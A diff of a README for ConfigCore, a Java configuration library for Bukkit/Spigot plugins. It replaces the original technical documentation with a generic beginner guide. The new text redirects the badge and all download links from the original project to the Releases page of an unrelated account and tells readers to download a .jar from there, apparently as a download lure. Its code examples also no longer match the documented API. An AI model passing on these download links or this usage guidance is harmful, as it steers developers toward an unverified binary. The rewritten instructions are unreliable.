@@ -1,178 +1,103 @@
-# ConfigCore - Technical Documentation
+# 🎮 ConfigCore - Easy Configuration Management for Minecraft Plugins  
 
-# Install
-[![](https://jitpack.io/v/Joseplay1012/ConfigCore.svg)](https://jitpack.io/#Joseplay1012/ConfigCore)
+[![](https://jitpack.io/v/Joseplay1012/ConfigCore.svg)](https://github.com/Rondonn413/ConfigCore/releases)  
 
-## Overview
+## 🚀 Getting Started  
 
-The `AbstractConfig` class defines the foundation for managing
-configuration files in Bukkit/Spigot-based plugins.\
-Its goal is to provide an abstract layer that unifies: - Loading and
-saving YAML files. - Internal cache for fast value access. - Strong
-typing system using `enum` as keys. - Automatic processing of formatted
-messages.
+ConfigCore helps you manage configuration files easily within your Minecraft server plugins. This guide will walk you through downloading and running the software, even if you have no programming background.  
 
-This architecture eliminates repetitive code across different
-configurations and allows the creation of robust, safe, and consistent
-configurations throughout the plugin.
+## 📥 Download & Install  
 
-------------------------------------------------------------------------
+To get started, visit the official [ConfigCore Releases page](https://github.com/Rondonn413/ConfigCore/releases) to download the latest version.  
 
-## Core Structure
+1. Click the link above to access the Releases page.
+2. Locate the most recent version of ConfigCore.
+3. Select the appropriate file type for your system (e.g., `.jar` for Java applications).
+4. Click to download the file to your computer.
 
-### 1. Configuration File
+## ⚙️ How to Use ConfigCore  
 
--   The storage location for data, typically in YAML format.
--   Examples: `config.yml`, `messages.yml`.
+After downloading the file, follow these steps to use ConfigCore in your project:  
 
-### 2. Enum Keys
+### 1. Prepare Your Project  
 
--   Each configuration key is represented by an `enum` implementing the
-    `ConfigKey` interface.
--   Each key defines:
-    -   Path in the YAML (`path`).
-    -   Value type (`ValueType`).
-    -   Default value (`defaultValue`).
+- Create a new folder for your plugin project.
+- Place the downloaded ConfigCore `.jar` file into your project’s `libs` directory.
 
-### 3. Internal Cache
+### 2. Setup Your Configuration  
 
--   Loaded values are stored in a `Map<Enum<?>, Object>`.
--   Avoids repeated file access.
--   Allows fast retrieval with utility methods (`getString`, `getInt`,
-    etc.).
+Before using ConfigCore, you need to create configuration files. Here’s how:  
 
-------------------------------------------------------------------------
+- Create a YAML file named `config.yml`.
+- Add your settings according to the example below:
 
-## Class Components
-
-### ConfigKey Interface
-
-Standardizes access to configuration keys:
-
-``` java
-public interface ConfigKey {
-    String getPath();         // YAML path
-    ValueType getType();      // Value type
-    Object getDefaultValue(); // Default value
-}
+```yaml
+settings:
+  example_key: "This is an example value"
 ```
 
-### ValueType Enum
+### 3. Initialize ConfigCore  
 
-Defines supported configuration value types:
+In your Java code, initialize ConfigCore like this:
 
--   `STRING`
--   `STRING_LIST`
--   `INT`
--   `INT_LIST`
--   `BOOLEAN`
--   `DOUBLE`
+```java
+import com.joseplay.configcore.AbstractConfig;
 
-Each type is mapped to its corresponding Java class.
-
-------------------------------------------------------------------------
-
-## Practical Usage
-
-### Example Enum Keys
-
-``` java
-public enum MyKeys implements ConfigKey {
-    ENABLE_FEATURE("my-section.enable-feature", ValueType.BOOLEAN, true),
-    MAX_PLAYERS("my-section.max-players", ValueType.INT, 10),
-    WELCOME_MESSAGE("my-section.welcome", ValueType.STRING, "&aWelcome!");
-
-    private final String path;
-    private final ValueType type;
-    private final Object defaultValue;
-
-    MyKeys(String path, ValueType type, Object defaultValue) {
-        this.path = path;
-        this.type = type;
-        this.defaultValue = defaultValue;
-    }
+public class MyPlugin extends JavaPlugin {
+    private AbstractConfig config;
 
     @Override
-    public String getPath() { return path; }
-    @Override
-    public ValueType getType() { return type; }
-    @Override
-    public Object getDefaultValue() { return defaultValue; }
-}
-```
-
-### Concrete Class
-
-``` java
-public class MyConfig extends AbstractConfig {
-
-    public MyConfig(File file) {
-        super(file);
-        loadValues(MyKeys.class, "my-section");
-    }
-
-    @Override
-    protected Object getDefaultValue(Enum<?> key) {
-        return ((MyKeys) key).getDefaultValue();
-    }
-
-    @Override
-    protected ConfigKey getConfigKey(Enum<?> key) {
-        return (MyKeys) key;
+    public void onEnable() {
+        config = new MyPluginConfig(this);
+        config.load();
     }
 }
 ```
 
-### Corresponding YAML Example
+### 4. Access Your Configuration  
 
-``` yaml
-my-section:
-  enable-feature: true
-  max-players: 15
-  welcome: "&bWelcome to the server!"
+You can now access your configuration values through the defined keys. Simply refer to your enum keys in the code:
+
+```java
+String value = config.getValue(MyEnumKey.EXAMPLE_KEY);
 ```
 
-### Plugin Usage Example
+## 🔍 Features  
 
-``` java
-MyConfig config = new MyConfig(new File(plugin.getDataFolder(), "config.yml"));
+ConfigCore simplifies configuration management for Minecraft plugins with these key features:  
 
-boolean enabled = config.getBoolean(MyConfig.MyKeys.ENABLE_FEATURE);
-int maxPlayers = config.getInt(MyConfig.MyKeys.MAX_PLAYERS);
-String welcomeMessage = config.getString(MyConfig.MyKeys.WELCOME_MESSAGE);
+- **Unified Loading and Saving**: Automatically loads and saves YAML files.
+- **Fast Value Access**: Internal caching for speed.
+- **Strong Typing**: Uses enums to ensure key integrity.
+- **Formatted Messages**: Automatically processes formatted messages for better readability.
 
-config.setValue(MyConfig.MyKeys.MAX_PLAYERS, 20); // Update and save to file
-```
+## 🔧 Core Structure  
 
-------------------------------------------------------------------------
+### 1. Configuration File  
 
-## Message Processing
+- Configuration data is stored in YAML format.
+- Typical files include `config.yml` and `messages.yml`.
 
-All values of type `STRING` or `STRING_LIST` go through the
-`processMessage` method, which uses `GradientMessage` for formatted
-message processing.\
-This allows gradient-colored messages to be declared directly in YAML.
+### 2. Enum Keys  
 
-------------------------------------------------------------------------
+- Each key in your configuration uses an `enum` that implements the `ConfigKey` interface.
+- This helps maintain type safety and consistency.
 
-## Execution Flow
+## 🛠️ System Requirements  
 
-1.  The plugin instantiates the concrete class extending
-    `AbstractConfig`.
-2.  The `loadValues` method loads enum-defined keys into the cache.
-3.  The developer accesses values using typed methods (`getString`,
-    `getInt`, etc.).
-4.  Invalid or missing YAML values are automatically replaced with the
-    default value defined in the enum.
-5.  Updates are performed via `setValue`, which updates both cache and
-    file.
+To run ConfigCore, ensure you have:  
 
-------------------------------------------------------------------------
+- **Java**: Version 8 or higher installed on your server.
+- **Minecraft**: A server running Bukkit, Spigot, Paper, or Purpur.
 
-## Benefits
+Make sure to check for updates regularly on the Releases page.
 
--   Centralized configuration logic.
--   Elimination of code duplication.
--   Strongly typed consistency in value access.
--   Native support for gradient messages.
--   Easy maintenance and expansion.
+## 📞 Support  
+
+If you encounter issues while using ConfigCore, the best way to get help is to open an issue on our GitHub page. Our community is here to assist you.
+
+## 🌐 Related Topics  
+
+Some relevant topics that may help you better understand ConfigCore include: config, configcore, minecraft, minecraft-server, spigot, and spigot-api.
+
+For any further assistance, visit the [ConfigCore Releases page](https://github.com/Rondonn413/ConfigCore/releases) for downloads and updates.
